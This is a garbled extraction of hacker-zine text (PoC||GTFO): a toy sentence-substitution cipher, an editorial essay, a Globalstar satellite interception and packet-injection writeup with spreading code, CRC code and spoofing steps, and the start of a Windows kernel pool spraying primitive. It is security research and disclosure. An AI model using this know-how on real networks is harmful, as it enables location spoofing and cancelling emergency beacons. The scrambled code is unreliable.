|
+ - - - Js - - -+
+ - Sp * i +
+ - Ds -+
|
| + - - Ds -+
|
|
|
|
|
| |
|
I . p take . v my role . n seriously as . p a pastor . n
The difficulty is the enumeration of paths that would cover the key space if we want to map one path
to another one. So, for a first attempt, let’s keep the grammatical structure of the plaintext, and we will
replace every word by another that respects the same structure. After wrapping some Bash scripting around
link-grammar and its dictionaries, here’s what we can get:
$ echo " my example illustrates a means to obfuscate a complex sentence easily " |./ encode
@23 :2 n .1:2865 v .4.2:1050 a n .1:4908 to v .4.1:1352 a adj .1:720 n .1:7124 adv .1:369
This is one possible encoding of the input: every word is replaced by a reference to a wordlist and its
position in the list. Hopefully, another script allows us to reverse this process:
$ echo " my example illustrates a means to obfuscate a complex sentence easily " |./ encode |./ decode
my example illustrates a means to obfuscate a complex sentence easily
So far, so good. Now we will encode the positions using a secret key (123 in this example) with a very
very stupid 16-bit numeric cipher.
$ echo " my example illustrates a means to obfuscate a complex sentence easily " |./ encode 123
@23 :1 n .1:7695 v .4.2:2054 a n .1:2759 to v .4.1:2070 a adj .1:2518 n .1:5439 adv .1:123
$ echo " my example illustrates a means to obfuscate a complex sentence easily " |./ encode 123|./ decode 123
my example illustrates a means to obfuscate a complex sentence easily
$ echo " my example illustrates a means to obfuscate a complex sentence easily " |./ encode 123|./ decode 124
its storey siphons a blink to terrify a sublime filbert irretrievably
Using any wrong key would lead to another grammatically correct sentence. So we managed to build an
(admittedly stupid) crypto system that is pretty hard to bruteforce, as all attempts would lead to grammat-
ically correct sentences, giving no clue to the bruteforcing attacker. It is nevertheless only moderately hard
to break, because one could, for example, classify the results by frequency of those words or word groups in
English text to keep the best candidates. But the same reasoning can be used to enhance the PoC and get
better statistical results, harder for an attacker to disqualify.
Actually, we can do better: let’s send one of those weird sentences instead of the encoded path. This
gives plausible deniability: you can even deny it is a message encoded with this method, and claim that you
wrote it after partaking of a few Laphroaig Quarter Cask ;-) British neighbors are advised, however, that if
this leads to the UK banning Laphroaig Quarter Cask for public safety reasons, the Pastor might no longer
be their friend.
$ echo " my example illustrates a means to obfuscate a complex sentence easily " |./ encode |./ decode 123
your search cements a tannery to escort a unrelieved clause exuberantly
This can be deciphered by whoever knows the key:
$ echo " your search cements a tannery to escort a unrelieved clause exuberantly " |./ encode 123|./ decode
my example illustrates a means to obfuscate a complex sentence easily
And an attempt to decipher it with a wrong key gives another grammatically correct sentence:
62$ echo " your search cements a tannery to escort a unrelieved clause exuberantly " |./ encode 124|./ decode
your scab slakes a bluffer to integrate a introspective hamburger provocatively
If someone attempts to brute-force it, she would end up with something like this:
$ echo " your search cements a tannery to escort a unrelieved clause exuberantly " |./ bruteforce
...
22366: their presentiment reprehends a saxophone to irk a topless mind perennially
22367: your cry compounds a examiner to shoulder a massive bootlegger unconsciously
22368: our handcart renounces a lamplighter to imprint a outbound doorcase weakly
22369: my neurologist fascinates a p l en i po te n ti ar y to butcher a psychedelic imprint automatically
22370: their safecracker vents a spoonerism to refurnish a shaggy parodist complacently
22371: your epicure extols a governor to belittle a indecorous clip heatedly
22372: our kilt usurps a monger to punish a loud foothold indirectly
22373: my piranha mugs a resistor to evict a obstetric malaise laconically
22374: its controller unsettles a duchess to ponder a diversionary beggar riotously
22375: your glen mollifies a interjection to embezzle a forgetful decibel speciously
22376: our misdeal countermands a pedant to typify a imperturbable heyday topically
22377: their bower misstates a colloquialism to disorientate a apoplectic warrantee courteously
22378: its downpour copies a frolic to sweeten a circumspect cavalcade dispiritedly
22379: your infidel resurrects a masseuse to manufacture a differential fairway famously
22380: my abstract contaminates a birthplace to squire a unaltered subsection lukewarmly
22381: their co - op resents a deuce to inveigle a unsubtle attendant objectionably
^C
The scripts are available in this issue’s PDF/ZIP, but the PDF itself can be used to secure your
communications—because why not?
$ chmod + x pocorgtfo08 . pdf
$ echo " encrypt this sentence ! " | ./ pocorgtfo08 . pdf -e 12345
besmirch this carat !
$ echo " besmirch this carat ! " | ./ pocorgtfo08 . pdf -d 12345
encrypt this sentence !
The PDF includes an ELF x86-64 version of link-grammar, so you will need to execute the PDF on a
matching platform. Any 64-bit Debian-like distro with libaspell15 installed should do.
For extra credit, you may construct a meaningful sentence that encodes to Chomsky’s famously mean-
ingless but grammatical example, “Colorless green ideas sleep furiously.”
Ideas presented in this little essay were first discussed by the author at Hack.lu 2007 HackCamp.
Have fun!
6313
Fast Cash for Cyber Munitions!
by Pastor Manul Laphroaig,
Unlicensed Proselytizer
International Church of the Weird Machines
Howdy, neighbor!
Are you one of those merchants of cyber-death that certain Thought Leading Technologists keep warning
us about? Have you been hoarding bugs instead of sharing them with the world? Well, at this church we
won’t judge you, but we’d be happy to judge your proofs of concept, sharing the best ones with our beloved
readers.
So set that little PoC free, neighbor, and let it come to me, pastor@phrack org!
–——–
———
—–—–
———
–—–
——–
—
––—–
———
Do this: write an email telling our editors how to do reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll happily translate from French, Russian, or German. If
you don’t speak those languages, we’ll draft a translator from those poor sods who owe us favors.
Like an email, keep it short. Like an email, you should assume that we already know more than a bit
about hacking, and that we’ll be insulted or—WORSE!—that we’ll be bored if you include a long tutorial
where a quick reminder would do.
Just use 7-bit ASCII if your language doesn’t require funny letters, as whenever we receive something
typeset in OpenOffice, we briefly mistake it for a ransom note. Don’t try to make it thorough or broad.
Don’t use Powerpoint bullet-points. Keep your code samples short and sweet; we can leave the long-form
code as an attachment.
Do pick one quick, clever low-level trick and explain it in a few pages. Teach me how to distinguish
real errors from intentionally mistransmitted symbols over radio. Show me how to reverse engineer firmware
from a combine harvester. Don’t tell me that it’s possible; rather, teach me how to do it myself with the
absolute minimum of formality and bullshit.
Like an email, we expect informal (or faux-biblical) language and hand-sketched diagrams. Write it in
a single sitting, and leave any editing for your poor preacherman to do over a bottle of fine scotch. Send
this to pastor@phrack org and hope that the neighborly Phrack folks—praise be to them!—aren’t man-in-
the-middling our submission process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, D.D.
64PoC k GTFO
PASTOR MANUL LAPHROAIG’S
TABERNACLE CHOIR
SINGS REVERENT ELEGIES
OF THE
SECOND CRYPTO WAR
September 14, 2015
9:2 A Sermon on Newton and Turing 9:8 A Recipe for TCP/IPA
9:3 Globalstar Satellite Communications 9:9 Mischief with AX.25 and APRS
9:4 Keenly Spraying the Kernel Pools 9:10 Napravi i ti Računar „Galaksija“
9:5 The Second Underhanded Crypto Contest 9:11 Root Rights are a Grrl’s Best Friend!
9:6 Cross VM Communications 9:12 What If You Could Listen to This PDF?
9:7 Antivirus Tumors 9:13 Oona’s Puzzle Corner!
Novi Sad, Serbia and Stockholm, Sweden:
Funded by Single Malt as Midnight Oil and the
Tract Association of PoCkGTFO and Friends,
to be Freely Distributed to all Good Readers, and
to be Freely Copied by all Good Bookleggers.
Это самиздат. Quand un livre a été écrit et bien écrit, n’ayez aucun scrupule, prenez-le, copiez.
0, $0 USD, £0, 0 RSD, 0 SEK, $50 CAD. pocorgtfo09.pdf.
1Legal Note: To all interested parties except Adobe Systems, unlimited license is granted to read, duplicate,
share, reprint, and learn from this document. Adobe Systems may not read or learn from this document
unless they agree in writing to (1) forgive the editors for pirating Adobe Photoshop 4.0 for Macintosh and
(2) stop blacklisting our lovely little polyglot files! (An apology to Dmitry Sklyarov would also be nice.)
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror–don’t merely link!–pocorgtfo09.pdf and our other issues far and wide, so our articles can help fight
the coming robot apocalypse.
Technical Note: You’ll be happy to find that pocorgtfo09.pdf is a polyglot that is valid in three file
formats. You may interpret it as a PDF to read this issue, as a ZIP to read this issue’s source code
releases, or as a WavPack lossless audio file to listen to f bz’ classic from page 60. You may have to change
the file extension to .wv, depending on your audio player. A list of compatible players is available at
http://www.wavpack.com/#Software.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland. Secret government labs in Canada may use P3 (280 mm x 430 mm) if they like. The outermost
sheet should be on thicker paper to form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo09.pdf -o pocorgtfo09-book.pdf
Preacherman
Ethics Advisor
Poet Laureate
Editor of Last Resort
Carpenter of the Samizdat Hymnary
Editorial Whipping Boy
Funky File Formats Polyglot
Assistant Scenic Designer
Minister of Spargelzeit Weights and Measures
2
Manul Laphroaig
The Grugq
Ben Nagy
Melilot
Redbeard
Jacob Torrey
Ange Albertini
Philippe Teuwen
FX1
Please stand; now, please be seated.
Neighbors, please join me in reading this tenth
release of the International Journal of Proof of Con-
cept or Get the Fuck Out, a friendly little collection
of articles for ladies and gentlemen of distinguished
ability and taste in the field of software exploitation
and the worship of weird machines. This is our tenth
release, given on paper to the fine neighbors of Novi
Sad, Serbia and Stockholm, Sweden.
If you are missing the first nine issues, we the
editors suggest pirating them from the usual loca-
tions, or on paper from a neighbor who picked up a
copy of the first in Vegas, the second in São Paulo,
the third in Hamburg, the fourth in Heidelberg, the
fifth in Montréal, the sixth in Las Vegas, the seventh
from his parents’ inkjet printer during the Thanks-
giving holiday, the eighth in Heidelberg, or the ninth
in Montréal.
Page 4 contains our very own Pastor Manul
Laphroaig’s sermon on Newton and Turing, in which
we learn about the academics’ affection for Turing-
completeness and why they should be allowed to
marry it.
On page 7, Colby Moore provides all the details
you’ll need to sniff simplex packets from the Glob-
alstar satellite constellation.
Page 12 introduces some tips by Peter Hlavaty of
the Keen Team on kernel pool spraying in Windows
and Linux.
Page 19 presents the results of the second Under-
handed Crypto Contest, held at the Crypto Village
of Defcon 23.
On page 21, Sophia D’Antoine introduces some
tricks for communicating between virtual machines
co-located on the same physical host. In particular,
the mfence instruction can be used to force strict or-
dering, interfering with CPU instruction pipelining
in another VM.
Eric Davisson, on page 26, presents a nifty lit-
tle trick for causing quarantined malware to be re-
detected by McAfee Enterprise VirusScan! This par-
ticular tumor is benign, but we bet a neighborly
reader can write a malignant variant.
Ron Fabela of Binary Brew Works, on page 28,
presents his recipe for TCP/IPA, a neighborly beer
with which to warm our hearts and our spirits dur-
ing the coming apocalypse.
Our centerfold in this issue is the schematic dia-
gram to an Electronika BK 0010-01 computer from
the USSR. You wouldn’t believe how difficult it is
to google the proper way to render a centerfold in
L A TEX!
Vogelfrei shares with us some tricks for APRS
and AX.25 networking on page 34. APRS exists
around much of the western world, and all sorts of
mischief can be had through it. (But please don’t
be a jerk.)
Much as some readers think of us as a secu-
rity magazine, we are first and foremost a systems-
internals journal with a bias toward the strange and
the classic designs. Page 40 contains a reprint, in
the original Serbian, of Voja Antonić’ article on the
Galaksija, his Z80 home computer design, the very
first in Yugoslavia.
f bz is a damned fine neighbor of ours, both a
mathematician and a musician. On page 60 you’ll
find her latest single, Root Rights are a Grrl’s Best
Friend! If you’d rather listen to it than just read
the lyrics, run vlc pocorgtfo09.pdf and jump to
page 61, where Philippe Teuwen describes how he
made this fine document a polyglot of PDF, ZIP,
and WavPack.
On page 62, you will find Oona’s Puzzle Corner,
with all sorts of nifty games for a child of five. If
you aren’t clever enough to solve them, then ask for
help from a child of five!
On page 64, the last and most important
page, we pass around the collection plate. Pastor
Laphroaig doesn’t need a touring jumbo jet like
those television and radio preachers; rather, this
humble worshiper of the weird machines needs a
Turing jumbo jet with which to storm Heaven!
3“Academics should just marry Turing Completeness already!”
—the grugq
2
From Newton to Turing, a Happy Family
by Pastor Manul Laphroaig D.D.
When engineers first gifted humanity with horse-
less carriages that moved on rails under their own
power, this invention, for all its usefulness, turned
out to have a big problem: occasional humans and
animals on the rails. This problem motivated many
inventors to look for solutions that would be both
usable and effective.
These days, “conservation of energy” is supposed
to be one of those word combinations to check off
on multiple-choice tests that make one eligible for
college. 1 Yet we should remember that the steam
engine was invented well before these laws of clas-
sical mechanics were made comprehensible or even
understood at all. Moreover, it took some further
40–90 years after Watt’s ten-horsepower steam en-
gine patent to formulate the principles of thermody-
namics that actually make a steam engine work—by
which time it was chugging along at 10,000 horse-
power, able to move not just massive amounts of
machinery but even the engine’s own weight along
the rails, plus a lot more. 2
All of this is to say that if you hear scientists
doubting how an engineer can accomplish things
without their collective guidance, they have a lot
of history to catch up with, starting with that thing
called the Industrial Revolution. On the other hand,
if you see engineers trying to build a thing that just
doesn’t seem to work, you just might be able to point
them to some formulas that suggest their energies
are best applied elsewhere. Distinguishing between
these two situations is known as magic, wisdom, ex-
treme luck, or divine revelation; whoever claims to
be able to do so unerringly is at best a priest, 3 not
a scientist.
–——–
———
—–—–
Unfortunately, none worked. The reason for
this is not so easy to explain—at least Aristotelian
physics had no explanation, and few scientists till
Galileo’s time were interested in one. On the one
hand, motion had to brought on by some force and
tended to kinda barrel about once it got going; on
the other hand, it also tended to dissipate eventu-
ally. It took about 500 years from doubting the
Aristotelian idea that motion ceased as soon as its
impelling force ceased to the first clear pronounce-
ment that motion in absence of external forces was
a persistent rather than a temporary virtue; and an-
other 600 for the first correct formulation of exactly
what quantities of motion were conserved. Even so,
it took another century before the mechanical con-
servation laws and the actual names and formulas
for momentum and energy were written down as we
know them.
1 Whether one actually understands them or not—and, if you value your sanity, do not try to find if your physics teachers
actually understand them either. You have been warned.
2 Not that stationary steam engines were weaklings either: driving ironworks and mining pumps takes a lot of horses.
3 Typically, of a religion that involves central planning and state-run science. This time they’ll get it right, never fear!
4There is an old joke that whatever activity needs
to add “science” to its name is not too sure it is one.
Some computer scientists may not take too kindly
to this joke, and point out that it’s actually the
word “computer” that’s misleading, as their science
transcends particular silicon-and-copper designs. It
is undeniable, though, that hacking as we know it
would not exist without actual physical computers.
As scientists, we like exhaustive arguments: ei-
ther by full search of all finite combinatorial pos-
sibilities or by tricks such as induction that look
convincing enough as a means of exhausting infinite
combinations. We value above all being able to say
that a condition never takes place, or always holds.
We dislike the possibility that there can be a situa-
tion or a solution we can overlook but someone may
find through luck or cleverness; we want a yes to
be a yes and a no to mean no way in Hell. But ei-
ther full search or induction only apply in the world
of ideal models—call them combinatorial, logical, or
mathematical—that exclude any kinds of unknown
unknowns.
Hence we have many models of computation:
substituting strings into other strings (Markov algo-
rithms), rewriting formulas (lambda calculus), au-
tomata with finite and infinite numbers of states,
and so on. The point is always to enumerate all fi-
nite possibilities or to convince ourselves that even
an infinite number of them does not harbor the ones
we wish to avoid. The idea is roughly the same as
using algebra: we use formulas we trust to reason
about any and all possible values at once, but to do
so we must reduce reality to a set of formulas. These
formulas come from a process that must prod and
probe reality; we have no way of coming up with
them without prodding, probing, and otherwise ex-
perimenting by hunch and blind groping—that is, by
building things before we fully understand how they
work. Without these, there can be no formulas, or
they won’t be meaningful.
So here we go. Exploits establish the variable
space; “science” searches it, to our satisfaction or
otherwise, or—importantly to save us effort—asserts
that a full and exhaustive search is infeasible. This
may be the case of energy conservation vs. trying
to construct a safer fender—or, perhaps, the case
of us still trying to formulate what makes sense to
attempt.
That which we call the “arms race” is a part of
this process. With it, we continually update the
variable spaces that we wish to exhaust; without it,
none of our methods and formulas mean much. This
brings us to the recent argument about exploits and
Turing completeness.
Knowledge is power. 4 In case of the steam en-
gine, the power emerged before the kind of knowl-
edge called “scientific” (if one is in college) or “basic”
(if one is a politician looking to hitch a ride—because
actual science has a tradition of overturning its own
“basics” as taught in schools for at least decades if
not centuries). In any case, the knowledge of how
to build these engines was there before the knowl-
edge that actually explained how they worked, and
would hardly have emerged if these things had not
been built already.
4 The question of whether that which is not power is still knowledge is best left to philosophers. One can blame Nasir al-Din
al-Tusi for explaining the value of Astrology to Khan Hulagu by dumping a cauldron down the side of a mountain to wake up
the Khan’s troops and then explaining that those who knew the causes above remained calm while those who didn’t whirled in
confusion below—but one can hardly deny that being able to convince a Khan was, in fact, power. Not to mention his horde.
Because a Khan, by definition, has a very convincing comeback for “Yeah? You and what horde?”
5Our very own situation, neighbors, is not unlike
that of the steam power before the laws of ther-
modynamics. There are things that work (pump
mines, drive factories), and there are official ways of
explaining them that don’t quite work. Eventually,
they will merge, and the explanations will catch up,
and will then become useful for making things that
work better—but they haven’t quite yet, and it is
frustrating.
did the academia do it again.
Yet it is also clear why they did it. Academic
CS operates by models and exhaustive searches or
reasoning. Its primary method and deliverable is
exhaustive analysis of models, i.e., the promise that
certain bad things never happen, that all possible
trajectories of a system have been or can be enu-
merated.
Academia first saw exploit programming when
it was presented to it in the form of a model; prior
to that, their eyes would just slide off it, because it
looked “ad-hoc”, and one can neither reason about
“ad-hoc” nor enumerate it (at least, if one wants
to meet publication goals). When it turned out it
had a model, academia did with it what it normally
does with models: automating, tweaking, searching,
finding their theoretical limits, and relating them to
other models, one paper at a time. 5
This is not a bad method; at least, it gave us
complex compilers and CPUs that don’t crumble
under the weight of their bugs. 6 Eventually we will
want the kind of assurances this method creates—
when their models of unexpected execution are com-
plete enough and close enough to reality. For now,
they are not, and we have to go on building our en-
gines without guidance from models, but rather to
make sure new models will come from them.
Not that we are without hope. One only has
to look to Grsecurity/PaX at any given time to
see what will eventually become the precise stuff of
Newton’s laws for the better OS kernels; similarly,
the inescapable failure modes of data and program-
ming complexity will eventually be understood as
clearly as the three principles of thermodynamics.
Until then our best bet is to build engines—however
unscientific—and to construct theories—however re-
moved from real power—and to hope that the en-
gineering and the science will take enough notice of
each other to converge within a lifetime, as they have
had the sense to do during the so-called Industrial
Revolution, and a few lucky times since.
And to this, neighbors, the Pastor raises not one
but two drinks—one for the engineering orienting the
science, and one for the science catching up with the
knowledge that is power, and saving it the effort of
what cannot be done—and may they ever converge!
Amen.
This frustration is understandable. As soon
as academics rediscovered a truly nifty kind of
exploit programming, they not just focused on
the least practically relevant aspect of it (Tur-
ing completeness)—but did so to the exclusion of
all other kinds of niftyness such as information
leaks, probabilistic programming (heap feng-shui
and spraying), parallelism (cloning and pinning of
threads to sap randomization), and so on. That
focus on the irrelevant to the detriment of the rele-
vant had really rankled. It was hard to miss where
the next frontier of exploitation’s hard programming
tasks and its next set of challenges lay, but oh boy,
5 And some of these papers were true Phrack-like gems that, true to the old-timey tradition, explained and exposed surprising
depths of common mechanisms: see, for example, SROP and COOP.
6 While, for example, products of the modern web development “revolution” already do, despite being much less complex
than a CPU.
63
Breaking Globalstar Satellite Communications
by Colby Moore
It might be an understatement to say that hackers have a fascination with satellites. Fortunately, with
advancements in Software Defined Radio such as the Ettus Research USRP and Michael Ossmann’s HackRF,
satellite hacking is now not only feasible, but affordable. Here we’ll discuss the reverse engineering of
Globalstar’s Simplex Data Service, allowing for interception of communications and injection of data back
into the network.
Rumor has it, that after deployment, Globalstar’s first generation of satellites began to fail, possibly due
to poor radiation hardening. This affected the return path data link, where Globalstar would transmit to a
user. To salvage the damaged satellite network, Globalstar introduced a line of simplex products that enable
short, one-way communication from the user to Globalstar.
The nature of the service makes it ideal for asset tracking and remote sensor monitoring. While extremely
popular with oil and gas, military, and shipping industries, this technology is also widely used by consumers.
A company called SPOT produces consumer-grade asset trackers and personal locator beacons that utilize
this same technology.
Globalstar touts their simplex service as “extremely difficult” to intercept, noting that the signal’s “Low-
Probability-of-Intercept (LPI) and Low- Probability-of-Detection(LPD) provide over-the-air security.” 7
In this article I’ll outline the basics for reverse engineering the Globalstar Simplex Data Services mod-
ulation scheme and protocol, and will provide the technical information necessary to interface with the
network.
3.1
Network Architecture
The network is comprised of many Low Earth Orbit, bent-pipe satellites. Data is transmitted from the user
to the satellite on an uplink frequency and repeated back to Earth on a downlink frequency. Globalstar
ground stations all over the world listen for this downlink data, interpret it, and expose it to the user via an
Internet-facing back-end. Each ground station provides a several thousand mile window of data coverage.
Bent-pipe satellites are “dumb” in that they do not modify the transmitted data. This means that the
data on the uplink is the same on the downlink. Thus, with the right knowledge, a skilled adversary can
intercept data on either link.
3.2
Tools and Code
This research was conducted using GNURadio and Python for data processing and an Ettus Research B200
for RF work. Custom proof-of-concept toolsets were written for DSSS and packet decoding. Devices tested
include a SPOT Generation 3, a SPOT Trace, and a SmartOne A.
3.3
Frequencies and Antennas
Four frequencies are allocated for the simplex data uplink. Current testing has only shown operation on
channel A.
Channel
A
B
C
D
Frequency
1611.25 MHz
1613.75 MHz
1616.25 MHz
1618.78 MHz
7 http://productsupport.globalstar.com/2009/02/09/are-simplex-messages-secure/
7Globalstar uses left-hand circular-polarized antennas for transmission of simplex data from the user to
the satellite. The Globalstar GSP-1620 antenna, designed for transmitting from the user to a satellite, has
proven adequate for experimentation.
Downlink is a bit more complicated, and far more faint. Channels vary by satellite, but are within the
6875–7055 MHz range. Both RHCP and LHCP are used for downlink.
3.4
Direct Sequence Spread Spectrum
Devices using the simplex data service implement direct sequence spread spectrum (DSSS) modulation to
reliably transmit data using low power. DSSS is a modulation scheme that works by mixing a slow data signal
with a very fast Pseudo Noise (PN) sequence. Since the pseudo-random sequence is known, the resulting
signal retains all of the original data information but spread over a much wider spectrum. Among other
benefits, this process makes the signal more tolerant to interference.
In Globalstar’s implementation of DSSS, packet data is first modulated as non-differential BPSK at
100.04 bits/second, then spread using a repeating 255 chip PN sequence at a rate of 1,250,000 chips/second.
Here “chip” refers to one bit of a PN sequence, so that it is not confused with actual data bits.
3.5
Pseudo Noise Sequence / M-Sequences
Pseudo Noise (PN) sequences are periodic binary sequences known by both the transmitter and receiver.
Without this sequence, data cannot be received. The simplex data service uses a specific type of PN sequence
called an M-Sequence.
M-Sequences have the unique property of having a strong autocorrelation for phase shifts of zero but
very poor correlation for any other phase shift. This makes the detection of the PN in unknown data, and
subsequently locking on to a DSSS signal, relatively simple.
All simplex data network devices examined use the same PN sequence to transmit data. By knowing one
code, all network data can be intercepted.
3.6
Obtaining The M-Sequence
In order to intercept network data, the PN sequence must be recovered. For each bit of data transmitted,
the PN sequence repeats 49 times. Data packets contain 144 bits.
81 ,250 ,000 chips
1 second
1 PN s e q u e n c e
−−−−−−−−−−−−−−− x −−−−−−−−−−−−− x −−−−−−−−−−−−−− = 49 PN s e q u e n c e s / b i t
1 second
100.04 b i t s
255 c h i p s
The PN sequence never crosses a bit boundary, so it can be inferred that
x o r (PN, data ) == PN
By decoding the transmitted data stream as BPSK, 8 we can demodulate a spread bitstream. Note that
demodulation in this manner negates any processing gain provided from DSSS and thus can only be received
over short distances, so for long distances you will need to use a proper DSSS implementation.
Viewing the demodulated bitstream, a repeating sequence is observed. This is the PN, the spreading
code key to the kingdom.
The simplex data network PN code is 1111111100101101011011101010101110010011011010011001101-
00011101101100010001001111010010010000111100010100111000111110101111001110100001010110010-
10001011000001100100011000011011111101110000100000100101010010111110000001110011000110101-
0000000101110111101100.
3.7
Despreading
DSSS theory states that to decode a DSSS-modulated signal, a received signal must be mixed once again
with the modulating PN sequence; the original data signal will then fall out. However, for this to work, the
PN sequence needs to be phase-aligned with the mixed PN/data signal, otherwise only noise will emerge.
Alignment of the PN sequence to the data stream if accomplished by correlating the PN sequence against
the incoming datastream at each sample. When aligned, the correlation will peak. To despread, this
correlation peak is tracked and the PN is mixed with the sampled RF data. The resulting signal is the
100.04 bit/second non-differential BPSK modulated packet data.
3.8
Decoding and Locations
Once the signal is despread, a BPSK demodulator is used to recover data. The result is a binary stream,
144 bytes in length, representing one data packet. The data packet format is as follows:
Field
Preamble
ESN
Message #
Packet #
Packet Seq. #
User Data
CRC24
Bits
(10)
(26)
(4)
(4)
(4)
(72)
(24)
Description
0000001011 signifies start of packet
3 bits for manufacturer ID and 23 bits for unit ID
message number modulo 16, saved in non-volatile memory
number of packets in a message
sequence number for each packet in a message
9 bytes of user information, MSB first
CRC is 24 bits with polynomial: 114377431
Simplex data packets can technically transmit any 72 bits of user defined data. However, the network is
predominantly used for asset tracking and thus many packets contain GPS coordinates being relayed from
tracking devices. This data scheme for GPS coordinates can be interpreted with the following Python code.
l a t i t u d e = i n t ( user_data [ 8 : 3 2 ] , 2 ) ∗ 90 / 2∗∗23
l o n g i t u d e = 360 − i n t ( user_data [ 3 2 : 5 6 ] , 2 ) ∗ 180 / 2∗∗23
8 DSSS
theory shows us that DSSS is the same as BPSK for a BPSK data signal.
93.9
CRC
Packets are verified using a 24 bit CRC. The data packet minus the preamble and CRC are fed into the CRC
algorithm in order to verify or generate a CRC. The following Python code implements the CRC algorithm.
def c r c T w e n t y f o u r (TX_Data) :
2
4
6
k = 0
m = 0
TempCRC = 0
Crc = 0xFFFFFF
8
f o r k in r a n g e ( 0 , 1 4 ) :
#c a l c checksum on 14 b y t e s s t a r t i n g w i t h ESN
10
#o f f s e t t o s k i p p a r t o f t h e p r e a m b l e ( d i c t a t e d by a l g o r i t h m )
TempCRC = i n t (TX_Data [ ( k ∗ 8 )+8 : ( k ∗ 8 )+8+8 ] , 2 )
12
14
i f 0 == k :
#s k i p 2 p r e a m b l e b i t s i n b y t e 0
TempCRC = TempCRC & 0 x 3 f
16
18
Crc = Crc ^ (TempCRC)<<16
20
22
f o r m in r a n g e ( 0 , 8 ) :
Crc = Crc << 1
24
i f Crc & 0 x1000000 :
#s e e d CRC
Crc = Crc ^ 0114377431L
26
28
30
Crc = (~ Crc ) & 0 x f f f f f f ;
#end c r c g e n e r a t i o n . l o w e s t 24 b i t s o f t h e l o n g h o l d t h e CRC
32
34
36
#f i r s t CRC b y t e t o TX_Data
b y t e 1 4 = ( Crc & 0 x 0 0 f f 0 0 0 0 ) >> 16
#se c on d CRC b y t e t o TX_Data
b y t e 1 5 = ( Crc & 0 x 0 0 0 0 f f 0 0 ) >> 8
38
40 #t h i r d CRC b y t e t o TX_Data
b y t e 1 6 = ( Crc & 0 x 0 0 0 0 0 0 f f )
42 f i n a l _ c r c = ( b y t e 1 4 << 1 6 ) | ( b y t e 1 5 << 8 ) | b y t e 1 6
44 i f f i n a l _ c r c != i n t (TX_Data [ 1 2 0 : 1 4 4 ] , 2 ) :
print " E r r o r : CRC f a i l e d "
sys . exit (0)
46
3.10
Transmitting
DISCLAIMER: It is most likely illegal to transmit on Globalstar’s frequencies where you live. Do so at your
own risk. Remember, no one likes late night visits from the FCC and it would really suck if you interrupted
someone’s emergency communication!
By knowing the secret PN code, modulation parameters, data format, and CRC, it is possible to craft
custom data packets and inject them back into the satellite network. The process is as follows:
• Generate a custom packet
10• Calculate and affix the packet’s CRC
• Spread the packet using the Globalstar PN sequence
• BPSK modulate the spread data and transmit on the RF carrier
Various SDR boards should have enough power to communicate with the network, however COTS am-
plifiers are available for less than a few hundred dollars. Specifications suggests a transmit power of about
200 milliwatts.
3.11
Spoofing
SPOT produces a series of asset trackers called SPOT Trace. SPOT also provides SPOT_Device_Updater.pkg,
an OS X update utility, to configure various device settings. This utility contains development code that is
never called by the consumer application.
The updater app package contains SPOT3FirmwareTool.jar. Decompilation shows that a UI view calls
a method writeESN() in SPOTDevice.class. You read that correctly, they included the functionality to
program arbitrary serial numbers to SPOT devices!
This UI can be called with a simple Java utility.
import com . g l o b a l s t a r . SPOT3FirmwareTool . UI . DebugConsole ;
2
public c l a s s SpotDebugConsole {
public s t a t i c void main ( S t r i n g [ ] a r g s ) {
DebugConsole . main ( a r g s ) ;
6
}
}
4
Upon execution, a debug console is launched, allowing the writing of arbitrary settings including ESNs, to
the SPOT device. (This functionality was included in Spot Device Updater 1.4 but has since been removed.)
3.12
Impact
The simplex data network is implemented in countless places worldwide. Everything from SCADA monitor-
ing to emergency communications relies on this network. To find that there is no encryption or authentication
on the services examined is sad. And to see that injection back into the network is possible is even worse.
Using the specifications outlined here, it is possible—among other things—to intercept communications
and track assets over time, spoof an asset’s location, or even cancel emergency help messages from personal
locator beacons.
One could also enhance their own service, create their own simplex data network device, or use the
network to transmit their own covert communications.
3.13
PoC and Resources
This work was presented at BlackHat USA 2015 and proof-of-concept code is available both by Github and
within this PDF file. 9
9 git clone https://github.com/synack/globalstar
unzip pocorgtfo09.pdf globalstar.tar.bz2
114
Unprivileged Data All Around the Kernels; or,
Pool Spray the Feature!
by Peter Hlavaty of Keen Team
When it comes to kernel exploitation, you might think about successful exploitation of interesting bug
classes such as use-after-free and over/under-flows. In such exploitation it is sometimes really useful to ensure
that the corrupted pointer will still point to accessible, and in the best scenario also controllable, data.
As we described in our recent blogpost 10 about kernel security, although controlling kernel data to such
an extent should be impossible and unimaginable, this is, in fact, not the case with current OS kernels.
In this article we describe layout and control of pool data for various kernels, in different scenarios, and
with some nifty examples.
4.1
Windows
1. Small and big allocations: There are a number of known approaches to invoking ExAllocatePool
(kmalloc) in kernel, with more or less control over data shipped to kernel. Two notable examples are
SetClassLongPtrW 11 by Tarjei Mandt and CreateRoundRectRgn/PolyDraw 12 by Tavis Ormandy. Another
option we were working on recently resides in SessionSpace and grants full control of each byte except those
in the header space. We successfully leveraged this approach in Pwn2Own 2015 and described it this year
at Recon. 13
We use the win32k!_gre_bitmap object.
You can think of it as a kind of kmalloc. Consider the following code:
1 c l a s s CBitmapBufObj :
p u b l i c IPoolBuf
3 {
gdi_obj<HBITMAP> m_bitmap ;
5 public :
s i z e _ t A l l o c ( void ∗ mem, s i z e _ t s i z e ) o v e r r i d e {
7
m_bitmap . r e s e t ( CreateBitmap (
size , 1 , 1 ,
9
RGB ∗ 8 ,
nullptr ) ) ;
11
i f ( ! get () )
return 0 ;
13
return S e t B i t m a p B i t s ( m_bitmap , s i z e , mem) ;
}
15
10 http://www.k33nteam.org/noks.html
11 http://j00ru.vexillium.org/dump/recon2015.pdf
12 http://blog.cmpxchg8b.com/2013/05/introduction-to-windows-kernel-security.html
http://www.slideshare.net/PeterHlavaty/power-of-linked-list
Time Font Hunt You Down in 4 Bytes, Peter Hlavaty and Jihui Lu, Recon 2015
13 This
12void F re e ( ) o v e r r i d e {
m_bitmap . r e s e t ( ) ;
}
17
19 } ;
2. Different pools matter: On Windows, exploitation of different objects can get a bit tricky, because
they can reside in different pools.
